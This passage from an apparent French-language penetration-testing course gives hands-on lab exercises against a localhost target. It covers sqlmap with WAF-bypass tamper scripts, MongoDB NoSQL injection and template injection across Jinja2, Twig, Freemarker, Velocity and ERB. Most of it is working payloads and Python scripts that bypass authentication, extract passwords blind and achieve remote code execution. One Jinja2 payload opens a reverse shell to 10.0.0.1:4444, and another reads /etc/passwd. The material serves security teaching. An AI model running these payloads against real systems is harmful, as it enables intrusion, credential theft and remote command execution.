# --cookie : ajoute un cookie de session à chaque requête
# --auth-type=Bearer : type d'authentification HTTP (Bearer JWT)
# --auth-token : token JWT à inclure dans le header Authorization
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
       --cookie="sessionid=abc123" \
       --auth-type=Bearer \
       --auth-token="eyJhbGciOiJIUzI1NiIs..."

# Utilisation avec proxy (pour intercepter avec Burp)
# --proxy : redirige tout le trafic sqlmap vers le proxy
# Permet d'inspecter/modifier les requêtes de sqlmap dans Burp
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
       --proxy="http://127.0.0.1:8080" \
       --technique=T

# Utilisation avec tamper script (bypass WAF automatique)
# --tamper=space2comment,randomcase : applique deux tamper scripts
# space2comment : remplace espaces par /**/, randomcase : mélange la casse
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
       --technique=T \
       --tamper=space2comment,randomcase

# Liste des tamper scripts disponibles dans sqlmap
# Chaque script correspond à une technique de bypass WAF
ls /opt/sqlmap/tamper/
```

**Explication des commandes sqlmap :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `git clone --depth 1 <url> <dossier>` | Clone le dépôt Git (dernier commit seulement) |
| `ln -s <source> <destination>` | Crée un lien symbolique pour un accès plus facile |
| `sqlmap -r <fichier>` | Charge une requête depuis un fichier (format Burp) |
| `--cookie="sessionid=abc123"` | Ajoute un cookie de session HTTP |
| `--auth-type=Bearer` | Spécifie le type d'authentification HTTP (Bearer, Basic, Digest, etc.) |
| `--auth-token="..."` | Token d'authentification (JWT, etc.) |
| `--proxy="http://127.0.0.1:8080"` | Redirige le trafic via un proxy (Burp, ZAP) |
| `--tamper=espace2comment,randomcase` | Applique des tamper scripts pour contourner les WAF |
| `ls /opt/sqlmap/tamper/` | Liste les scripts de tamper disponibles |

**Tamper scripts utiles :**

| Script | Effet |
|--------|-------|
| `space2comment` | Remplace les espaces par `/**/` |
| `randomcase` | Mélange la casse des mots-clés |
| `between` | Remplace `>` par `NOT BETWEEN` |
| `equaltolike` | Remplace `=` par `LIKE` |
| `halfversionedmorekeywords` | Ajoute des commentaires versionnés MySQL |
| `ifnull2casewhenisnull` | Remplace IFNULL par CASE |
| `modsecurityversioned` | Contourne ModSecurity |
| `charencode` | Encode les caractères en URL |

---

## 3. NoSQL Injection — MongoDB (T1190)

### MITRE ATT&CK

| ID | Nom | Description |
|----|-----|-------------|
| **T1190** | Exploit Public-Facing Application | Exploitation d'une injection NoSQL dans une application exposée |

### 3.1 Principe

Contrairement au SQL, le NoSQL (MongoDB) utilise des opérateurs JSON pour interroger la base. L'injection consiste à injecter des opérateurs MongoDB dans les paramètres JSON ou URL-encodés.

| Opérateur | Rôle | Exemple |
|-----------|------|---------|
| `$ne` | Not equal | `{"password": {"$ne": ""}}` |
| `$gt` | Greater than | `{"age": {"$gt": "18"}}` |
| `$regex` | Expression régulière | `{"username": {"$regex": "^a"}}` |
| `$where` | Code JavaScript | `{"$where": "this.password.length > 5"}` |
| `$nin` | Not in | `{"role": {"$nin": ["admin", "root"]}}` |
| `$exists` | Champ existe | `{"email": {"$exists": true}}` |

### 3.2 Bypass d'authentification MongoDB

#### Injection via formulaire JSON (POST)

```json
// Payload JSON envoyé au endpoint d'authentification
// username : "admin" — on cible l'utilisateur admin
// password : {"$ne": ""} — l'opérateur $ne (not equal) retourne vrai si le mot de passe n'est pas ""
// Si le serveur vérifie juste l'existence d'un document (count > 0), le bypass réussit
{
  "username": "admin",
  "password": { "$ne": "" }
}
```

**Explication du payload :**

| Élément | Rôle/Explication |
|---------|------------------|
| `"username": "admin"` | Cible le compte administrateur |
| `"password": {"$ne": ""}` | Opérateur MongoDB $ne (not equal) : match tout mot de passe non vide |

Cette requête retourne l'utilisateur `admin` si son mot de passe n'est pas vide (quasiment toujours vrai). Si le serveur vérifie directement le `count()` > 0, l'authentification est contournée.

#### Injection via URL-encoded

# === EXÉCUTER SUR LA MACHINE ATTAQUANTE (Kali) ===
```bash
# Bypass classique : envoie un JSON avec $ne pour username ET password
# curl -s : mode silencieux
# -H "Content-Type: application/json" : header indiquant un corps JSON
# -d '{...}' : corps de la requête avec les opérateurs NoSQL injectés
# {"$ne": ""} : les deux champs utilisent l'opérateur "not equal"
# Résultat : retourne le premier utilisateur dont le username n'est pas vide
curl -s http://localhost:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# Retourne le premier utilisateur non-admin en utilisant $gt (greater than)
# {"$gt": ""} : match tout username qui est > chaîne vide (ASCII)
# Les caractères ASCII non-nuls sont tous > chaîne vide
# Peut retourner un utilisateur non-admin si le tri par défaut est alphabétique
curl -s http://localhost:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `curl -s` | Requête HTTP silencieuse |
| `-H "Content-Type: application/json"` | Header indiquant que le corps est au format JSON |
| `-d '{"username": {"$ne": ""}, ...}'` | Corps JSON avec opérateur MongoDB `$ne` (not equal) |
| `{"$ne": ""}` | Not equal — retourne vrai si le champ est différent de chaîne vide |
| `{"$gt": ""}` | Greater than — retourne vrai si le champ est plus grand que chaîne vide (ASCII) |

### 3.3 Extraction blind via $regex

L'extraction aveugle fonctionne en testant des caractères un par un avec `$regex` :

```json
// Payload : tester si le mot de passe commence par 'a'
// "^a" : regex "commence par a"
// Si la réponse contient "success" ou "token", le pattern match
{"username": "admin", "password": {"$regex": "^a"}}

// Payload : tester si le mot de passe commence par 'b'
// On itère caractère par caractère pour reconstituer le mot de passe complet
{"username": "admin", "password": {"$regex": "^b"}}
```

**Explication des payloads :**

| Élément | Rôle/Explication |
|---------|------------------|
| `{"$regex": "^a"}` | Expression régulière : match si la valeur commence par 'a' |
| `{"$regex": "^b"}` | Expression régulière : match si la valeur commence par 'b' |

#### Script Python d'extraction blind NoSQL

```python
#!/usr/bin/env python3
# Script d'extraction aveugle NoSQL via regex MongoDB
# Cible : http://localhost:8080/api/login (POST JSON)

import requests  # Bibliothèque HTTP
import string    # Constantes de caractères
import sys
import json     # Manipulation JSON
import re       # Expressions régulières

# URL de l'endpoint d'authentification
TARGET = "http://localhost:8080/api/login"
# Jeu de caractères autorisés dans le mot de passe
CHARSET = string.ascii_lowercase + string.digits + '_-@.'

def test_regex(regex_pattern):
    """Teste si un pattern regex correspond au mot de passe de l'utilisateur admin.
    Retourne True si le pattern match (succès de connexion)."""
    # Payload NoSQL avec $regex sur le champ password
    payload = {
        "username": "admin",
        "password": {"$regex": regex_pattern}
    }
    # Envoie une requête POST avec le payload JSON
    # json=payload : sérialise automatiquement en JSON et définit Content-Type
    r = requests.post(TARGET, json=payload)
    # Si la réponse contient "success" ou "token", l'authentification a réussi
    return "success" in r.text or "token" in r.text

def extract_password(username="admin", max_len=64):
    """Extrait le mot de passe caractère par caractère via blind $regex."""
    extracted = ""
    # Parcourt chaque position jusqu'à max_len
    for pos in range(max_len):
        found = False
        for c in CHARSET:
            # Construction de la regex : "^" (début) + extrait + caractère courant + ".*" (suite)
            # Ex: "^a" pour 1er char = 'a', "^ab" pour 2 premiers = 'ab'
            regex = f"^{extracted}{c}.*"
            if test_regex(regex):
                extracted += c
                print(f"[+] Position {pos} : '{c}' => password: {extracted}")
                found = True
                break
        if not found:
            # Vérifier si le mot de passe est complet
            if test_regex(f"^{re.escape(extracted)}$"):
                print(f"[+] Mot de passe complet trouvé : {extracted}")
                return extracted
            break
    return extracted

if __name__ == "__main__":
    print("[*] Extraction du mot de passe pour 'admin'...")
    pwd = extract_password()
    print(f"\n[+] Résultat : admin:{pwd}")
```

**Explication du script :**

| Élément | Rôle/Explication |
|---------|------------------|
| `import requests` | Bibliothèque HTTP pour envoyer des requêtes POST |
| `import re` | Bibliothèque d'expressions régulières pour `re.escape()` |
| `TARGET` | URL de l'endpoint d'authentification vulnérable |
| `CHARSET` | Caractères possibles dans le mot de passe (minuscules, chiffres, symboles) |
| `test_regex(pattern)` | Teste si un motif regex correspond au mot de passe (blind) |
| `extract_password()` | Itère caractère par caractère pour reconstituer le mot de passe |
| `f"^{extracted}{c}.*"` | Regex : commence par les caractères déjà trouvés + nouveau caractère + n'importe quoi après |

### 3.4 Injection via $where (JavaScript Injection)

L'opérateur `$where` exécute du JavaScript sur le serveur MongoDB. Cela permet :

```json
// Time-based detection : sleep(5000) bloque le serveur 5 secondes
// || true : s'assure que la condition retourne true même si sleep échoue
{"$where": "sleep(5000) || true"}

// Extraction via exception : throw 'match' ou 'no' selon le caractère testé
// this.password[0] : accède au 1er caractère du champ password
// Les doubles accolades {{}} échappent les accolades en JSON
{"$where": "if(this.password[0]=='a'){{throw 'match'}}else{{throw 'no'}}"}

// Lire des variables d'environnement (MongoDB 4.x+)
// hex_md5(env.HOSTNAME) : hash MD5 du hostname (exfiltration OOB potentielle)
{"$where": "hex_md5(env.HOSTNAME)"}
```

**Explication des payloads $where :**

| Payload | Rôle |
|---------|------|
| `{"$where": "sleep(5000) \|\| true"}` | Time-based : bloque 5 secondes, retourne toujours vrai |
| `{"$where": "if(this.password[0]=='a'){{throw 'match'}}else{{throw 'no'}}"}` | Extraction aveugle : l'exception révèle le caractère |
| `{"$where": "hex_md5(env.HOSTNAME)"}` | Exfiltration : hash MD5 des variables d'environnement |

#### Payloads $where avancés

```json
// Fonction JavaScript complète : retourne true si username == 'admin'
// Permet de filtrer les documents de manière conditionnelle
{
  "$where": "function(){ if(this.username=='admin') { return true } }"
}

// Sleep JS pur (MongoDB 4.2+) : utilise la fonction sleep native de MongoDB
// sleep(5000) : met en pause 5 secondes
// return true : la condition est toujours vraie
{
  "$where": "function(){ sleep(5000); return true }"
}
```

**Explication des payloads $where avancés :**

| Payload | Rôle |
|---------|------|
| `function(){ if(this.username=='admin') { return true } }` | Filtre JavaScript : retourne les documents où username = 'admin' |
| `function(){ sleep(5000); return true }` | Time-based via fonction JS : sleep 5s, retourne true |

### 3.5 TP Guidé — Endpoint `/api/export` (POST JSON)

#### Étape 1 : Détection

```bash
# Requête normale avec une collection valide "users"
# Si le serveur retourne les données utilisateurs, l'endpoint fonctionne
curl -s http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": "users"}'

# Tentative d'injection $ne : remplacer la valeur "users" par {"$ne": ""}
# Si le serveur interprète l'opérateur NoSQL, il peut retourner une collection différente
# {"$ne": ""} signifie "collection différente de chaîne vide" — potentiellement la première collection
curl -s http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": {"$ne": ""}}'
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `curl -s <URL> -H "Content-Type: application/json" -d '{...}'` | Requête POST avec corps JSON vers l'endpoint |
| `{"collection": "users"}` | Requête normale : spécifie la collection à exporter |
| `{"collection": {"$ne": ""}}` | Test d'injection NoSQL : utilise $ne pour manipuler la sélection |

#### Étape 2 : Identifier les collections

```bash
# Tester différentes collections pour découvrir leur existence
# Chaque requête teste un nom de collection différent
# Si une collection existe, le serveur retourne ses données
curl -s http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": "transactions"}'

curl -s http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": "products"}'

curl -s http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": "sessions"}'
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `{"collection": "transactions"}` | Teste l'existence de la collection "transactions" |
| `{"collection": "products"}` | Teste l'existence de la collection "products" |
| `{"collection": "sessions"}` | Teste l'existence de la collection "sessions" |

#### Étape 3 : Injection $regex sur une collection

```bash
# Extraire les utilisateurs dont le nom commence par 'a' en utilisant $regex
# Le paramètre "filter" contient une condition NoSQL sur le champ "username"
# "$regex": "^a" : expression régulière qui match les chaînes commençant par 'a'
# Seuls les utilisateurs avec username commençant par 'a' seront retournés
curl -s http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": "users", "filter": {"username": {"$regex": "^a"}}}'
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `"filter": {"username": {"$regex": "^a"}}` | Filtre NoSQL : ne retourne que les users dont le nom commence par 'a' |
| `"$regex": "^a"` | Opérateur MongoDB regex : "^a" signifie "commence par a" |

#### Étape 4 : Test d'injection $where

```bash
# Tester si l'injection JavaScript via $where fonctionne
# "$where": "1" : une expression JS qui retourne toujours vrai (1 est truthy)
# Si la requête retourne des données, $where est exécuté côté serveur
curl -s http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": "users", "filter": {"$where": "1"}}'

# Time-based via $where : utilise sleep(5000) pour créer un délai
# --max-time 10 : timeout curl de 10 secondes (évite d'attendre indéfiniment)
# function(){ sleep(5000); return true } : fonction JS qui dort 5s et retourne true
# Si la requête prend ~5s, l'injection $where time-based est confirmée
curl -s --max-time 10 http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection": "users", "filter": {"$where": "function(){ sleep(5000); return true }"}}'
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `"$where": "1"` | Injection JS : "1" est évalué comme vrai en JavaScript |
| `"$where": "function(){ sleep(5000); return true }"` | Injection JS avec time-based : sleep 5 secondes |
| `--max-time 10` | Timeout curl à 10 secondes (évite d'attendre trop longtemps) |

#### Étape 5 : Extraction complète

```bash
# Sauvegarder le script d'extraction NoSQL :
cat > nosql_extract.py << 'PYEOF'
```

```python
#!/usr/bin/env python3
# Script d'extraction NoSQL complet pour /api/export
# Utilise l'injection $regex pour extraire les données caractère par caractère

import requests  # Bibliothèque HTTP
import json      # Manipulation JSON
import string    # Constantes de caractères
import sys

# URL de l'endpoint vulnérable
TARGET = "http://localhost:8080/api/export"

def extract_field(collection, field, regex):
    """Teste si un champ correspond à un pattern regex donné.
    Retourne True si au moins un document match le pattern."""
    # Construction du payload avec la collection et le filtre regex
    payload = {
        "collection": collection,
        "filter": {field: {"$regex": regex}}
    }
    # Envoi de la requête POST avec le payload JSON
    r = requests.post(TARGET, json=payload)
    # Si la requête réussit et retourne un tableau non vide, le pattern match
    return len(r.json()) > 0 if r.ok else False

def brute_field(collection, field, charset=string.ascii_lowercase + string.digits):
    """Extrait un champ caractère par caractère via blind regex.
    Teste chaque caractère possible à chaque position."""
    extracted = ""
    # Parcourt les positions (max 32 caractères)
    for pos in range(32):
        found = False
        for c in charset:
            # Pattern : commence par les caractères déjà trouvés + nouveau caractère
            pattern = f"^{extracted}{c}"
            if extract_field(collection, field, pattern):
                extracted += c
                print(f"[{collection}] {field} : {extracted}")
                found = True
                break
        if not found:
            break
    return extracted

if __name__ == "__main__":
    # Extraction des emails de la collection users
    print("[*] Extraction des emails...")
    email = brute_field("users", "email", charset=string.ascii_lowercase + string.digits + '@._-')
    print(f"[+] Email trouvé : {email}")

    # Extraction des mots de passe de la collection users
    print("[*] Extraction des mots de passe...")
    password = brute_field("users", "password", charset=string.printable)
    print(f"[+] Password trouvé : {password}")
```

PYEOF

**Explication du script :**

| Élément | Rôle/Explication |
|---------|------------------|
| `extract_field(collection, field, regex)` | Teste si un pattern regex match un champ dans une collection |
| `brute_field(collection, field, charset)` | Extrait un champ caractère par caractère via blind regex |
| `f"^{extracted}{c}"` | Construction de la regex : début de chaîne + caractères déjà trouvés |
| `len(r.json()) > 0` | Vérifie si la réponse JSON contient au moins un document (match) |
| `r.ok` | Vérifie le code HTTP (200 = OK) |

#### Étape 6 : Automatisation alternative

```bash
# Utiliser NoSQLMap (outil dédié à l'injection NoSQL)
# git clone : télécharge le dépôt NoSQLMap depuis GitHub
# cd /opt/nosqlmap : se place dans le répertoire de l'outil
# python nosqlmap.py : lance l'outil avec les paramètres :
#   --target http://localhost:8080 : URL cible
#   --method POST : méthode HTTP à utiliser
#   --data '{"username":"admin","password":"x"}' : données POST à tester
git clone https://github.com/codingo/NoSQLMap.git /opt/nosqlmap
cd /opt/nosqlmap
python nosqlmap.py --target http://localhost:8080 --method POST --data '{"username":"admin","password":"x"}'

# Alternative : Burp Suite + NoSQL injection payloads
# Burp permet d'intercepter et modifier les requêtes, avec des extensions dédiées NoSQL
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `git clone <url> <dossier>` | Clone un dépôt Git dans le dossier spécifié |
| `python nosqlmap.py --target <URL> --method POST --data '<json>'` | Lance NoSQLMap avec les paramètres de cible |
| `--target` | URL de l'application cible |
| `--method` | Méthode HTTP à utiliser (GET, POST, etc.) |
| `--data` | Données POST à tester (JSON contenant les paramètres) |

---

## 4. SSTI — Server-Side Template Injection (T1190)

### MITRE ATT&CK

| ID | Nom | Description |
|----|-----|-------------|
| **T1190** | Exploit Public-Facing Application | Exploitation SSTI menant à une exécution de code |
| **T1059** | Command and Scripting Interpreter | Exécution de commandes via le moteur de template |

### 4.1 Principe

La SSTI se produit quand un moteur de template interprète la saisie utilisateur comme du code de template au lieu de données statiques. Cela permet l'accès aux objets internes du framework et potentiellement une RCE.

### 4.2 Détection — Payloads universels

```http
# Requête HTTP brute POST vers /admin/templates
# Le paramètre template contient {{7*7}} qui est une expression mathématique simple
# Si le moteur interprète ce template, le résultat 49 remplace {{7*7}}
POST /admin/templates HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

template={{7*7}}
```

Si le résultat est `49` ou `7*7`, le moteur a interprété le template.

**Tableau de détection :**

| Payload | Résultat attendu | Moteur |
|---------|-----------------|--------|
| `{{7*7}}` | `49` | Jinja2, Twig |
| `${7*7}` | `49` | Freemarker, Velocity |
| `#{7*7}` | `49` | Pebble, Thymeleaf |
| `*{7*7}` | `49` | Velocity |
| `{{7*'7'}}` | `77` | Jinja2 (concaténation) |
| `<%= 7*7 %>` | `49` | ERB (Ruby) |
| `{{config}}` | Objet config | Flask/Jinja2 |
| `{{self}}` | Objet self | Jinja2 |

### 4.3 Framework-specific

#### Jinja2 (Python/Flask)

```jinja
{# Détection : multiplication simple — si rendu = 49, le moteur interprète #}
{{ 7*7 }}

{# Accès à la classe parente via MRO (Method Resolution Order) #}
{# '' (chaîne vide) → __class__ (str) → __mro__[1] (object) #}
{# __subclasses__() : liste toutes les sous-classes de object #}
{{ ''.__class__.__mro__[1].__subclasses__() }}

{# Recherche de subprocess.Popen dans la liste des sous-classes #}
{# [X] : remplacer X par l'index de subprocess.Popen trouvé précédemment #}
{# ('id', shell=True, stdout=-1) : arguments pour exécuter 'id' via Popen #}
{# .communicate() : récupère la sortie de la commande exécutée #}
{{ ''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, stdout=-1).communicate() }}
```

#### Twig (PHP)

```twig
{# Détection : multiplication simple — résulat 49 si Twig interprète #}
{{ 7*7 }}

{# RCE : utilise le filtre registerUndefinedFilterCallback pour enregistrer "exec" #}
{# self.env : environnement Twig #}
{# registerUndefinedFilterCallback("exec") : définit "exec" comme callback pour les filtres inconnus #}
{{ self.env.registerUndefinedFilterCallback("exec") }}
{{ self.env.getFilter("id") }}
{# getFilter("id") : déclenche le callback "exec" avec "id" comme argument → exécute id #}

{# Alternative via getFunctions : utilise setLoader pour charger system comme loader #}
{# _self : variable Twig contenant le template courant #}
{{ _self.env.setLoader(system) }}{{ _self.env.run("id") }}
```

#### Freemarker (Java)

```ftl
<#-- Détection : ${7*7} doit afficher 49 -->
${7*7}

<#-- RCE via new() : instancie la classe Execute de Freemarker -->
<#-- "freemarker.template.utility.Execute"?new() crée une instance de Execute -->
<#-- ("id") : appelle l'instance avec "id" comme commande à exécuter -->
${"freemarker.template.utility.Execute"?new()("id")}

<#-- RCE via Runtime : utilise l'objet Runtime Java -->
<#-- "java.lang.Runtime"?new() : tente d'instancier Runtime -->
<#-- ?new()?exec("id") : enchaîne pour exécuter "id" -->
${"java.lang.Runtime"?new()?new()?exec("id")}
```

#### Velocity (Java)

```velocity
#* Détection : #set($x = 7*7) définit $x à 49, puis $x l'affiche *#
#set($x = 7*7) $x

#* RCE : utilise $class.inspect pour accéder à java.lang.Runtime *#
#* .getRuntime().exec("id") : obtient le runtime et exécute "id" *#
#set($e = $class.inspect("java.lang.Runtime").getRuntime().exec("id"))
```

#### ERB (Ruby)

```erb
<%# Détection : <%= 7*7 %> doit afficher 49 dans la réponse %>
<%= 7*7 %>

<%# RCE via system() : exécute une commande shell directement %>
<%= system("id") %>

<%# RCE via backticks : exécute une commande et retourne le résultat %>
<%= `id` %>
```

### 4.4 Jinja2 RCE — 3 chemins différents

#### Chemin 1 : Cycler (le plus fiable)

```jinja
{# cycler : objet global Jinja2 utilisé pour alterner entre plusieurs valeurs dans une boucle #}
{# __init__ : constructeur de l'objet cycler (donne accès aux attributs internes) #}
{# __globals__ : dictionnaire des variables globales du module Python (contient os, open, etc.) #}
{# os.popen('id').read() : exécute la commande shell 'id' et lit le résultat #}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

**Explication :** L'objet `cycler` est accessible globalement dans Jinja2. On remonte à ses globals (qui contiennent les imports Python), on accède au module `os`, puis à `popen`.

#### Chemin 2 : Lipsum

```jinja
{# lipsum : générateur de texte lorem ipsum disponible dans Jinja2 #}
{# __globals__['os'] : accède au module os via le dictionnaire des globals #}
{# Alternative à cycler dans certains contextes où cycler est filtré #}
{{ lipsum.__globals__['os'].popen('id').read() }}
```

**Explication :** `lipsum` est un générateur de texte factice (lorem ipsum) disponible dans Jinja2. Son attribut `__globals__` expose les modules Python chargés.

#### Chemin 3 : config.\_\_class\_\_

```jinja
{# config : objet de configuration Flask, toujours disponible dans les templates Jinja2 #}
{# .__class__ : accède à la classe de l'objet config (Config) #}
{# .__init__ : constructeur de la classe Config #}
{# .__globals__['os'] : dictionnaire des globals du module Flask, contient 'os' #}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

**Explication :** `config` est l'objet de configuration Flask. On utilise le chaînage `__class__.__init__.__globals__` pour remonter jusqu'aux modules système et atteindre `os`.

#### Où trouver l'index de `subprocess.Popen` ?

```python
#!/usr/bin/env python3
# Script pour trouver l'index de subprocess.Popen dans les sous-classes de object
# Cela permet d'utiliser __subclasses__()[index] pour un RCE

import requests  # Bibliothèque HTTP
import re        # Expressions régulières

# URL de l'endpoint vulnérable à la SSTI
TARGET = "http://localhost:8080/admin/templates"

# 1ère requête : injecte la liste de toutes les sous-classes de object
# ''.__class__.__mro__[1].__subclasses__() liste toutes les classes chargées en mémoire
payload = "template={{ ''.__class__.__mro__[1].__subclasses__() }}"
r = requests.post(TARGET, data={"template": payload})

# Cherche la présence de subprocess.Popen dans la réponse
# re.findall : cherche toutes les occurrences du pattern (regex)
match = re.findall(r"<class 'subprocess\.Popen'>", r.text)
if match:
    print("[+] subprocess.Popen trouvé ! Recherche de l'index...")
    # 2e phase : injecter un accès à chaque index jusqu'à trouver Popen
    # Boucle for de 0 à 499 : teste chaque index possible
    for i in range(500):
        # Injecte __subclasses__()[i] pour afficher la classe à l'index i
        payload = f"template={{ ''.__class__.__mro__[1].__subclasses__()[{i}] }}"
        r = requests.post(TARGET, data={"template": payload})
        # Si la réponse contient "subprocess.Popen", on a trouvé l'index
        if "subprocess.Popen" in r.text:
            print(f"[+] Index trouvé : {i}")
            break
```

**Explication du script :**

| Élément | Rôle/Explication |
|---------|------------------|
| `import requests` | Bibliothèque HTTP pour envoyer les requêtes à l'endpoint SSTI |
| `import re` | Bibliothèque d'expressions régulières pour chercher Popen dans le résultat |
| `''.__class__.__mro__[1].__subclasses__()` | Liste toutes les sous-classes chargées en mémoire |
| `re.findall(r"<class 'subprocess\.Popen'>", text)` | Cherche la classe Popen dans la réponse |
| `__subclasses__()[i]` | Accède à la classe à l'index `i` dans la liste des sous-classes |
| **Boucle for i in range(500)** | Parcourt les premiers indices pour localiser Popen |

### 4.5 Payloads utiles (Jinja2)

```jinja
{# Commande simple : exécute 'id' et affiche l'utilisateur courant #}
{{ cycler.__init__.__globals__.os.popen('id').read() }}

{# Reverse shell : connexion shell inverse vers 10.0.0.1:4444 #}
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"').read() }}

{# Lire un fichier : utilise open() au lieu de os.popen() pour la lecture directe #}
{{ cycler.__init__.__globals__.open('/etc/passwd').read() }}

{# Lister un répertoire : utilise os.listdir() pour lister la racine #}
{{ cycler.__init__.__globals__.os.listdir('/') }}

{# Afficher la configuration Flask (SECRET_KEY, URIs DB, etc.) #}
{{ config }}

{# Afficher les routes Flask enregistrées (cartographie des endpoints) #}
{{ url_for.__globals__['current_app'].url_map }}
```

**Explication des payloads :**

| Payload | Rôle |
|---------|------|
| `cycler.__init__.__globals__.os.popen('id').read()` | Exécution de commande simple |
| `cycler.__init__.__globals__.os.popen('bash -c "..."').read()` | Reverse shell |
| `cycler.__init__.__globals__.open('/etc/passwd').read()` | Lecture de fichier |
| `cycler.__init__.__globals__.os.listdir('/')` | Liste le répertoire racine |
| `{{ config }}` | Affiche la configuration Flask |
| `url_for.__globals__['current_app'].url_map` | Affiche les routes de l'application |

#### Version compacte (pour champs de taille limitée)

```jinja
{# Version plus courte utilisant lipsum au lieu de cycler #}
{# Utile quand la taille du champ est limitée (moins de caractères) #}
{{ lipsum.__globals__.os.popen('id').read() }}
```

### 4.6 TP Guidé — Endpoint `/admin/templates` (POST form)

#### Étape 1 : Détection

# === EXÉCUTER SUR LA MACHINE ATTAQUANTE (Kali) ===
```bash
# Tester avec un payload mathématique simple : {{7*7}}
# Si le serveur interprète Jinja2, 7×7 = 49 sera affiché dans la réponse
# -d : envoie le paramètre POST "template" avec le payload SSTI
curl -s http://localhost:8080/admin/templates \
  -d "template={{7*7}}"

# Vérifier si le résultat contient "49" en filtrant la réponse
# grep -o : affiche seulement les parties qui matchent le pattern
# Si "49" apparaît, la SSTI est confirmée
curl -s http://localhost:8080/admin/templates \
  -d "template={{7*7}}" | grep -o "49"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `curl -s <URL> -d "template={{7*7}}"` | Envoie une requête POST avec le payload `{{7*7}}` dans le paramètre `template` |
| `\| grep -o "49"` | Filtre la réponse et affiche seulement "49" si présent |
| `{{7*7}}` | Template Jinja2 : 7×7 = 49 (si interprété correctement) |

#### Étape 2 : Confirmer Jinja2

```bash
# La concaténation de chaîne {{7*'7'}} est spécifique à Jinja2 (Python)
# En Jinja2, 7 * '7' = '7777777' (7 répété 7 fois) → résultat "77" tronqué
# Dans d'autres moteurs, cela produirait "49" (multiplication mathématique)
# -d : paramètre POST "template" avec le payload de test
curl -s http://localhost:8080/admin/templates \
  -d "template={{7*'7'}}"

# Résultat attendu : "77" (pas "49")
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `{{7*'7'}}` | En Jinja2, `*` sur une chaîne = répétition : résulat "7777777" (souvent tronqué en "77") |
| **Résultat "49"** | Signifierait une multiplication numérique → moteur différent (Twig/PHP) |
| **Résultat "77"** | Confirme Jinja2 (Python) — concaténation/répétition de chaîne |

#### Étape 3 : Accès à l'objet config

```bash
# {{config}} affiche l'objet de configuration Flask (si Flask est utilisé)
# L'objet config contient souvent des secrets : SECRET_KEY, clés API, URIs de base de données
curl -s http://localhost:8080/admin/templates \
  -d "template={{config}}"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `{{config}}` | Affiche l'objet `config` de Flask, révélant la configuration de l'application |

**Résultat typique :**

```json
{
  "SECRET_KEY": "super-secret-key-123",
  "SQLALCHEMY_DATABASE_URI": "mysql+pymysql://root:password@db/lab",
  "DEBUG": true,
  "SESSION_COOKIE_HTTPONLY": true,
  "SESSION_COOKIE_SAMESITE": "Lax"
}
```

#### Étape 4 : Remonter la chaîne d'héritage

```bash
# Lister les sous-classes disponibles via la chaîne MRO (Method Resolution Order)
# ''.__class__ : accède à la classe de la chaîne vide (str)
# .__mro__[1] : accède au parent direct de str (object)
# .__subclasses__() : liste toutes les sous-classes de object chargées en mémoire
# Permet de trouver subprocess.Popen pour exécuter des commandes
curl -s http://localhost:8080/admin/templates \
  -d "template={{ ''.__class__.__mro__[1].__subclasses__() }}"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `''.__class__` | Accède à la classe `str` depuis une chaîne vide |
| `.__mro__[1]` | Method Resolution Order : remonte au parent `object` (index 1) |
| `.__subclasses__()` | Liste toutes les classes filles de `object` — dont `subprocess.Popen` |
| **Objectif** | Trouver l'index de `subprocess.Popen` pour un RCE via `.__subclasses__()[index]` |

#### Étape 5 : Exécution de commande (RCE)

```bash
# Avec cycler (recommandé) : l'objet global Jinja2 "cycler" donne accès aux imports Python
# cycler.__init__ : constructeur de l'objet
# .__globals__ : dictionnaire des variables globales du module (contient "os")
# .os.popen('id').read() : exécute la commande "id" et lit le résultat
curl -s http://localhost:8080/admin/templates \
  -d "template={{ cycler.__init__.__globals__.os.popen('id').read() }}"

# Avec lipsum : autre objet global Jinja2
# lipsum.__globals__['os'] : accède au module os via le dictionnaire __globals__
# .popen('id').read() : exécute id et retourne la sortie
curl -s http://localhost:8080/admin/templates \
  -d "template={{ lipsum.__globals__['os'].popen('id').read() }}"

# Avec config.__class__ : via l'objet config Flask
# config.__class__ : classe de l'objet config
# .__init__.__globals__['os'] : remonte jusqu'aux globals pour accéder à os
curl -s http://localhost:8080/admin/templates \
  -d "template={{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
